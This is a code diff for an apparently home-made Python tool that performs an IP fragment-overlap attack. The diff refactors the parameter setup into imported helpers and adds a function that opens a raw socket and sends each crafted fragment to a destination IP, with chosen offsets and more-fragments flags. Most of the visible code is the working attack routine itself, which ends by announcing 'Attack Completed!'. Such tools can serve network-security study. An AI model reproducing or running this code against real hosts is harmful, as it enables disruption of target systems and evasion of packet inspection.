@@ -1,53 +1,18 @@
 #Attack Parameter Function 
 
+#Import Libraries:
 import socket
 import random
 import sys
 from math import ceil
 
-class attackParam:
-    def __init__(self,srcIPAddr,destIPAddr,IDField,TTL,protoField,fragSize,allFragms):
-        self.srcIPAddr=srcIPAddr
-        self.destIPAddr=destIPAddr
-        self.IDField=IDField
-        self.TTL=TTL
-        self.protoField=protoField
-        self.fragSize=fragSize
-        self.allFragms=allFragms
+#Import Functions:
+from helper_functs.attackParamClass import attackParamClass
+from helper_functs.rawsocket import rawSockGen
+from helper_functs.ipFormCheck import ipFormCheck
+from helper_functs.ipHeadFieldGen import ipHeadFieldGen
 
-def ipFormCheck(ipAdrr):
-    ipOctets=ipAdrr.split(".")
-
-    ipOctetsLen=len(ipOctets)
-    if (ipOctetsLen==4):
-        for i in range(ipOctetsLen):
-            octet=ipOctets[i]
-
-            isoctetInt=octet.isdigit()
-            if (isoctetInt==True):
-                octetInt=int(octet)
-            else:
-                isIpValid=False
-                break
-
-            if (octetInt>=0)and(octetInt<=255): 
-                if (i==(ipOctetsLen-1)):
-                    isIpValid=True
-                continue
-            else:
-                isIpValid=False
-                break  
-    else:
-        isIpValid=False
-
-    return isIpValid
-
-
-def attackParamGen(srcIP, dstIP):
-    
-    #Extract the Source and Destination IP addresses:
-    srcIPAddr=srcIP
-    destIPAddr=dstIP
+def simpleOverlapAttackParam(srcIP, dstIP):
 
     #Check if IP address have correct form:
     isSrcIpValid=ipFormCheck(srcIP)
@@ -126,4 +91,24 @@ def attackParamGen(srcIP, dstIP):
         })
 
     # Return all needed parameters as a class for easy access later in main attacker code:
-    return attackParam(srcIPAddr,destIPAddr,IDField,TTL,protoField,fragSize,allFragms)
+    return attackParamClass(srcIP,dstIP,IDField,TTL,protoField,fragSize,allFragms)
+
+
+def simpleOverlapAttack(attackParams):
+    rawSock=rawSockGen();
+
+    for i in range(len(attackParams.allFragms)): #For each fragment, build the IP header add the pre-built payload and send it to the target destination address
+        frag=attackParams.allFragms[i]
+
+        if (i==(len(attackParams.allFragms)-1)):
+            isLastFrag=True
+        else:
+            isLastFrag=False
+
+        ipHeadPacket=ipHeadFieldGen(attackParams.srcIPAddr,attackParams.destIPAddr,attackParams.IDField,attackParams.TTL,attackParams.protoField,frag["fragSize"],frag["fragOffset"],isLastFrag)
+
+        ipPacket=ipHeadPacket + frag["fragPayload"]
+        rawSock.sendto(ipPacket, (attackParams.destIPAddr,0))
+        print(f"[Frag {i+1}] size={frag['fragSize']}, offset={frag['fragOffset']}, MF={0 if isLastFrag else 1}")
+
+    print(f"=> Fragments sent with ID={attackParams.IDField}. Attack Completed!") 
